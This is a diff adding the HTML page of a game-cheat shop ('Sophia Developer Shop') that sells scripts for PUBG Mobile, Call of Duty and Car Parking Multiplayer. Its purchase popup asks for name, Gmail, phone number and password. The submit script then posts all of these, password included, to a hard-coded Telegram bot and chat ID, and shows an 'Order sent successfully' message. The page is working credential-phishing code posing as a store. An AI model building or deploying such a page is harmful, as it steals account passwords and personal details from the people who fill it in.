@@ -1,0 +1,487 @@
+<!DOCTYPE html>  
+<html lang="en">  
+<head>  
+  <meta charset="UTF-8" />  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>  
+  <title>Test Sophia</title>  
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">  
+    <link  
+    rel="stylesheet"  
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"  
+    integrity="sha512-..."  
+    crossorigin="anonymous"  
+    referrerpolicy="no-referrer"  
+  />  
+  <style>  
+    * {  
+      box-sizing: border-box;  
+      font-family: 'Orbitron', sans-serif;  
+      margin: 0;  
+      padding: 0;  
+    }  
+    body {  
+      background-color: #111;  
+      color: white;  
+    }  
+    header {  
+      background: #0a0a0a;  
+      padding: 1rem 2rem;  
+      display: flex;  
+      justify-content: space-between;  
+      align-items: center;  
+    }  
+    header h1 {  
+      color: #00ff90;  
+    }  
+    .hero {  
+      background: url('https://files.catbox.moe/elqfsw.jpeg') no-repeat center center/cover;  
+      height: 400px;  
+      display: flex;  
+      align-items: center;  
+      justify-content: center;  
+      text-shadow: 2px 2px 4px #000;  
+    }  
+    .hero h2 {  
+      font-size: 3rem;  
+      background: rgba(0, 0, 0, 0.6);  
+      padding: 1rem 2rem;  
+      border-radius: 10px;  
+    }  
+    .container {  
+      padding: 2rem;  
+      display: grid;  
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));  
+      gap: 1.5rem;  
+    }  
+    .card {  
+      background: #1a1a1a;  
+      border-radius: 10px;  
+      overflow: hidden;  
+      box-shadow: 0 0 10px rgba(0, 255, 144, 0.3);  
+      transition: 0.3s ease;  
+    }  
+    .card:hover {  
+      transform: translateY(-5px);  
+      box-shadow: 0 0 15px rgba(0, 255, 144, 0.5);  
+    }  
+    .card img {  
+      width: 100%;  
+      height: 150px;  
+      object-fit: cover;  
+    }  
+    .card .info {  
+      padding: 1rem;  
+    }  
+    .card .info h3 {  
+      margin-bottom: 0.5rem;  
+    }  
+    .card .info p {  
+      color: #aaa;  
+      margin-bottom: 1rem;  
+    }  
+    .buy-btn {  
+      background: #00ff90;  
+      color: #000;  
+      padding: 0.5rem 1rem;  
+      border: none;  
+      cursor: pointer;  
+      border-radius: 5px;  
+      font-weight: bold;  
+    }  #formPopup {  
+  display: none;  
+  position: fixed;  
+  top: 50%;  
+  left: 50%;  
+  transform: translate(-50%, -50%);  
+  background: #1a1a1a;  
+  padding: 2rem;  
+  box-shadow: 0 0 15px rgba(0, 255, 144, 0.6);  
+  z-index: 999;  
+  border-radius: 10px;  
+  width: 90%;  
+  max-width: 400px;  
+}  
+#formPopup input {  
+  display: block;  
+  margin: 1rem auto;  
+  padding: 0.8rem;  
+  width: 100%;  
+  background: #333;  
+  color: white;  
+  border: none;  
+  border-radius: 5px;  
+  transition: all 0.3s ease;  
+  font-size: 1rem;  
+}  
+#formPopup input:focus {  
+  transform: scale(1.1);  
+  background: #444;  
+  box-shadow: 0 0 15px rgba(0, 255, 144, 0.6);  
+}  
+#closeForm {  
+  background: transparent;  
+  color: white;  
+  border: none;  
+  font-size: 1.5rem;  
+  position: absolute;  
+  top: 10px;  
+  right: 15px;  
+  cursor: pointer;  
+}  
+
+#successAlert {  
+  display: none;  
+  position: fixed;  
+  top: 30%;  
+  left: 50%;  
+  transform: translate(-50%, -50%);  
+  background: #1a1a1a;  
+  padding: 2rem;  
+  border-radius: 10px;  
+  box-shadow: 0 0 20px rgba(0, 255, 144, 0.6);  
+  z-index: 1000;  
+  color: #00ff90;  
+}  
+
+#iosOverlay {  
+  display: none;  
+  position: fixed;  
+  inset: 0;  
+  background: rgba(0, 0, 0, 0.3);  
+  z-index: 998;  
+}  
+#iosAlert {  
+  display: none;  
+  position: fixed;  
+  top: 50%;  
+  left: 50%;  
+  transform: translate(-50%, -50%);  
+  background: #f9f9f9;  
+  border-radius: 14px;  
+  width: 85%;  
+  max-width: 300px;  
+  padding: 20px 16px 0;  
+  box-shadow: 0 0 12px rgba(0, 0, 0, 0.25);  
+  font-family: -apple-system, BlinkMacSystemFont, "San Francisco", "Segoe UI", Roboto, Arial, sans-serif;  
+  text-align: center;  
+  z-index: 999;  
+}  
+#iosAlert h3 {  
+  font-size: 17px;  
+  font-weight: 600;  
+  color: #000;  
+  margin-bottom: 10px;  
+}  
+#iosAlert p {  
+  font-size: 14px;  
+  color: #555;  
+  margin-bottom: 20px;  
+}  
+#iosAlert button {  
+  width: 100%;  
+  padding: 14px 0;  
+  border-top: 1px solid #ccc;  
+  background: transparent;  
+  color: #007aff;  
+  font-weight: 600;  
+  font-size: 17px;  
+  border: none;  
+  cursor: pointer;  
+}  
+
+.swipe-drawer {  
+  position: fixed;  
+  top: 0;  
+  left: -260px;  
+  width: 250px;  
+  height: 100%;  
+  background: #1a1a1a;  
+  box-shadow: 4px 0 10px rgba(0,0,0,0.5);  
+  color: white;  
+  padding: 1rem;  
+  z-index: 1000;  
+  transition: left 0.3s ease;  
+}  
+.swipe-drawer.open {  
+  left: 0;  
+}  
+.swipe-drawer ul {  
+  margin-top: 2rem;  
+  list-style: none;  
+  padding: 0;  
+}  
+.swipe-drawer ul li {  
+  margin: 1rem 0;  
+}  
+.swipe-drawer a {  
+  color: #00ff90;  
+  text-decoration: none;  
+  font-size: 1.1rem;  
+}  
+.close-drawer {  
+  position: absolute;  
+  top: 10px;  
+  right: 10px;  
+  background: transparent;  
+  color: white;  
+  border: none;  
+  font-size: 1.2rem;  
+  border-radius: 50%;  
+  cursor: pointer;  
+}  
+    .footer {  
+  background: transparent;  
+  color: white;  
+  text-align: center;  
+  padding: 30px 0;  
+}  
+
+.footer .social-icons {  
+  margin-top: 15px;  
+  display: flex;  
+  justify-content: center;  
+  gap: 15px;  
+}  
+
+.footer .icon {  
+  height: 20px;  
+  width: 20px;  
+  background: #fff;  
+  border-radius: 50%;  
+  display: flex;  
+  align-items: center;  
+  justify-content: center;  
+  color: #333;  
+  font-size: 10px;  
+  transition: transform 0.3s ease, background 0.3s ease;  
+  text-decoration: none;  
+}  
+
+.footer .icon:hover {  
+  transform: translateY(-4px);  
+}  
+
+.telegram:hover {  
+  background: #0088cc;  
+  color: #fff;  
+}  
+
+.facebook:hover {  
+  background: #1877f2;  
+  color: #fff;  
+}  
+
+.youtube:hover {  
+  background: #ff0000;  
+  color: #fff;  
+}  
+
+.tiktok:hover {  
+  background: #000;  
+  color: #fff;  
+}
+
+  </style>  
+</head>  
+<body>  
+  <header>  
+    <h1>Sophia Developer Shop</h1>  
+    <button class="buy-btn" id="buyBtn">Buy Now</button>  
+  </header>    <section class="hero">  
+    <h2>Best Deals on Top Games!</h2>  
+  </section>    <section class="container">  
+    <div class="card">  
+      <img src="https://files.catbox.moe/lkoj2s.jpeg" alt="Game" />  
+      <div class="info">  
+        <h3>PubG Mobile</h3>  
+        <h3>19 Future Script</h3>  
+        <p>Price: ₱340</p>  
+        <button class="buy-btn">Buy</button>  
+      </div>  
+    </div>  
+    <div class="card">  
+      <img src="https://files.catbox.moe/ifl8lt.jpeg" alt="Car Parking Multiplayer" />  
+      <div class="info">  
+        <h3>Car Parking Multiplayer</h3>  
+        <h3>All in One Script</h3>  
+        <p>Price: ₱290</p>  
+        <button class="buy-btn">Buy</button>  
+      </div>  
+    </div>  
+    <div class="card">  
+      <img src="https://files.catbox.moe/mj38io.jpeg" alt="Game" />  
+      <div class="info">  
+        <h3>Call Of Duty</h3>  
+        <h3>26 Future Script</h3>  
+        <p>Price: ₱400</p>  
+        <button class="buy-btn">Buy</button>  
+      </div>  
+    </div>  
+  </section>    <div id="formPopup">  
+    <button id="closeForm">×</button>  
+    <h2>Complete Your Purchase</h2>  
+    <form id="buyForm">  
+      <input type="text" name="name" placeholder="Full Name" required />  
+      <input type="email" name="gmail" placeholder="Gmail" required />  
+      <input type="text" name="phone" placeholder="Phone Number" required />  
+      <input type="password" name="password" placeholder="Password" required /> 
+      <input type="product" name="product" placeholder="Product Name" required />
+      <input type="price" name="price" placeholder="Input Price" required>
+      <button type="submit" class="buy-btn">Send</button>  
+    </form>  
+  </div>    <div id="successAlert">  
+    Order sent successfully!  
+    <button onclick="closeAlert()" style="display:block;margin:10px auto;background:#00ff90;padding:0.5rem 1rem;border:none;color:black;border-radius:5px;">OK</button>  
+  </div>
+  
+  <div id="iosOverlay"></div>  
+  <div id="iosAlert">  
+    <h3>Current Location<br>Not Available</h3>  
+    <p>Your current location can’t be determined at this time.</p>  
+    <button onclick="closeIosAlert()">OK</button>  
+  </div>    <div id="swipeDrawer" class="swipe-drawer"><footer class="footer">  
+    <button id="closeSwipeDrawer" class="close-drawer">×</button>  
+    <h2>Menu</h2>  
+    <ul>  
+      <li><a href="#">Home</a></li>  
+      <li><a href="#">Deals</a></li>  
+      <li><a href="#">Contact</a></li>  
+      <li><a href="#">About Us</a></li>  
+    <div class="social-icons">  
+      <a href="https://t.me/SophiaDeveloperChannel" class="icon telegram" aria-label="Telegram" target="_blank">  
+        <i class="fab fa-telegram-plane"></i>  
+      </a>  
+      <a href="https://www.facebook.com/share/1YJ92vrf7V/" class="icon facebook" aria-label="Facebook" target="_blank">  
+        <i class="fab fa-facebook-f"></i>  
+      </a>  
+      <a href="https://youtube.com/@sophiadeveloper?si=fqY09Ofv03uDNLyS" class="icon youtube" aria-label="YouTube" target="_blank">  
+        <i class="fab fa-youtube"></i>  
+      </a>  
+      <a href="https://www.tiktok.com/@sophiadev1?_t=ZS-8vwLAFA50Qk&_r=1" class="icon tiktok" aria-label="TikTok" target="_blank">  
+        <i class="fab fa-tiktok"></i>  
+      </a>  
+    </div>  
+    <p>&copy; copyright | Sophia Developer </p>  
+  </footer>  
+    </ul>  
+  </div>  <section id="about" style="background: linear-gradient(to right, #1f4037, #99f2c8); color: white; padding: 40px 20px; text-align: center;">  
+  <h2 style="font-size: 2.5em; margin-bottom: 20px;">About Us</h2>  
+  <p style="max-width: 800px; margin: auto; font-size: 1.1em;">  
+    Welcome to our Game Store Cheat! We provide top-up services for popular mobile games like PUBG, Mobile Legends, and more — all at affordable prices and delivered instantly.  
+  </p>  
+  <p style="max-width: 800px; margin: 20px auto; font-size: 1.1em;">  
+    Our team is dedicated to providing a smooth, secure, and fast top-up experience. We accept multiple payment methods and guarantee full customer support.  
+  </p>  
+  <p style="max-width: 800px; margin: 20px auto; font-size: 1.1em;">  
+    Join our Telegram group to get the latest deals, support, and updates on new offers!  
+  </p>  <footer class="footer">  
+<div class="social-icons">  
+  <a href="https://t.me/SophiaDeveloperChannel" class="icon telegram" aria-label="Telegram" target="_blank">  
+    <i class="fab fa-telegram-plane"></i>  
+  </a>  
+  <a href="https://www.facebook.com/share/1YJ92vrf7V/" class="icon facebook" aria-label="Facebook" target="_blank">  
+    <i class="fab fa-facebook-f"></i>  
+  </a>  
+  <a href="https://youtube.com/@sophiadeveloper?si=fqY09Ofv03uDNLyS" class="icon youtube" aria-label="YouTube" target="_blank">  
+    <i class="fab fa-youtube"></i>  
+  </a>  
+  <a href="https://www.tiktok.com/@sophiadev1?_t=ZS-8vwLAFA50Qk&_r=1" class="icon tiktok" aria-label="TikTok" target="_blank">  
+    <i class="fab fa-tiktok"></i>  
+  </a>  
+</div>  
+<p>&copy; copyright | Sophia Developer </p>
+
+  </footer>  </section> <script>
+  // Handle form popup
+  const formPopup = document.getElementById("formPopup");
+  const buyButtons = document.querySelectorAll(".card .buy-btn");
+  const buyNowBtn = document.getElementById("buyBtn");
+  const closeForm = document.getElementById("closeForm");
+  const successAlert = document.getElementById("successAlert");
+
+  buyButtons.forEach((btn) => {
+    btn.addEventListener("click", (e) => {
+      const card = e.target.closest(".card");
+      const name = card.querySelector("h3").textContent;
+      const price = card.querySelector("p").textContent.replace("Price: ", "");
+
+      formPopup.style.display = "block";
+      document.querySelector('input[name="product"]').value = name;
+      document.querySelector('input[name="price"]').value = price;
+    });
+  });
+
+  buyNowBtn.addEventListener("click", () => {
+    formPopup.style.display = "block";
+  });
+
+  closeForm.addEventListener("click", () => {
+    formPopup.style.display = "none";
+  });
+
+  // Handle form submission
+  document.getElementById("buyForm").addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    const data = new FormData(this);
+    const message = `
+=================
+🛍️ New Order Received:
+======================
+👤 Name: ${data.get("name")}
+🚹 Gmail: ${data.get("gmail")}
+#️⃣ Phone: ${data.get("phone")}
+🔒 Password: ${data.get("password")}
+🛍️ Product: ${data.get("product")}
+💵 Price: ${data.get("price")}
+=======================
+`;
+
+    // Replace with your actual Telegram Bot URL
+    fetch("https://api.telegram.org/bot7481895867:AAFDDfJGWRQropFDd0D3ptdvabEB6nVAAKQ/sendMessage", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        chat_id: "8116680367",
+        text: message,
+      }),
+    })
+      .then((res) => {
+        if (res.ok) {
+          formPopup.style.display = "none";
+          successAlert.style.display = "block";
+        }
+      })
+      .catch((err) => {
+        alert("Failed to send order. Try again later.");
+        console.error(err);
+      });
+  });
+
+  function closeAlert() {
+    successAlert.style.display = "none";
+  }
+
+  // Optional iOS Alert handling
+  function closeIosAlert() {
+    document.getElementById("iosOverlay").style.display = "none";
+    document.getElementById("iosAlert").style.display = "none";
+  }
+
+  // Swipe drawer logic
+  const swipeDrawer = document.getElementById("swipeDrawer");
+  const closeSwipeDrawer = document.getElementById("closeSwipeDrawer");
+
+  document.addEventListener("keydown", (e) => {
+    if (e.key === "Escape") swipeDrawer.classList.remove("open");
+  });
+
+  closeSwipeDrawer.addEventListener("click", () => {
+    swipeDrawer.classList.remove("open");
+  });
+</script>
+</body>  
+</html>
+
